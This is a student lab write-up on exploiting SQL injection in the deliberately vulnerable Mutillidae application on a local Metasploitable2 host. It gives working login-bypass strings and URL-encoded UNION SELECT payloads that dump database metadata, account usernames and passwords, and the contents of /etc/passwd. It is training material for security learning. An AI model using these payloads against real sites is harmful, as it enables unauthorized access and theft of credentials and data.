# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database

Identify IP address using ifconfig in Metasploitable2

![1](https://github.com/user-attachments/assets/46707e7c-d76b-457b-9362-ca9f3474f401)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![2](https://github.com/user-attachments/assets/ade0ca1e-934e-47b2-9ecd-a25d4ec636fb)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![3](https://github.com/user-attachments/assets/e73a83a9-8e91-4cc0-a45e-707a7b73991f)

Click on the menu Login/Register and register for an account

![4](https://github.com/user-attachments/assets/ed8129fb-b98c-43f5-bd42-3ae2636078b2)

Click on the link “Please register here”

![5](https://github.com/user-attachments/assets/157f3cca-05f8-4e46-a3c6-85c3c06051b3)

Click on “Create Account” to display the following page:

![6](https://github.com/user-attachments/assets/f323f5f6-d532-4e0a-b899-c85bf9490250)

he login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![7](https://github.com/user-attachments/assets/78907c08-1605-48e7-b5be-27213e4f6491)

Click “Login”. The logged in page will show as below:

![9](https://github.com/user-attachments/assets/30a676d8-95d4-4f03-99ae-13bfe43b75a8)

## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![10(2)](https://github.com/user-attachments/assets/12c6ad38-d34e-429f-aa85-950c6e7bc748)

Click the login button and you will see it enter into the administrator page.

![11](https://github.com/user-attachments/assets/0fb6e65b-acd4-4570-8b20-4788fd579f03)

## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![13](https://github.com/user-attachments/assets/81b24e1b-7801-47d6-abf6-df14b9a07f73)

![13(2)](https://github.com/user-attachments/assets/6afec951-0df1-4926-9d12-5f6238736953)

![14](https://github.com/user-attachments/assets/b16d6ee0-ce2b-4ea3-819b-23869342a5b3)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.46.129/mutillidae/index.php?page=user-info.php&username=Ashqar%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

After adding the order by 6 into the existing url , the following error statement will be obtained:

![15](https://github.com/user-attachments/assets/f66e4453-ba7e-4e59-b6f8-53ac2ed596c7)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

 As it is having 5 columns the query worked fine and it provides the correct result

 ![16](https://github.com/user-attachments/assets/1a0e00a7-b39f-4bb3-a93e-55843fb46d8a)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).

![17](https://github.com/user-attachments/assets/2197885b-d12c-4314-9571-3f4662ae8f2b)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.46.129/mutillidae/index.php?page=user-info.php&username=Ashqar%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![18](https://github.com/user-attachments/assets/ffc99bd6-f42b-4af7-a039-c37ddc12a4c9)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.46.129/mutillidae/index.php?page=user-info.php&username=Ashqar%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![19](https://github.com/user-attachments/assets/1c6dfd9a-874d-4f00-a331-deb76d019bcd)


The url once executed will  retrieve table names from the “owasp 10” database.
## Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
The column names of the accounts is displayed below for the following url:

http://192.168.46.129/mutillidae/index.php?page=user-info.php&username=Ashqar%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![20](https://github.com/user-attachments/assets/892f8b48-9852-477d-9ab7-f09f81a88ed6)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.46.129/mutillidae/index.php?page=user-info.php&username=Ashqar%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![21](https://github.com/user-attachments/assets/cdf8d0f4-25a9-4fc4-90bd-ca96b4222fea)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.46.129/mutillidae/index.php?page=user-info.php&username=Ashqar%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![22](https://github.com/user-attachments/assets/273449b1-ad4b-4e23-b82b-09652233db8f)



## RESULT:

The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
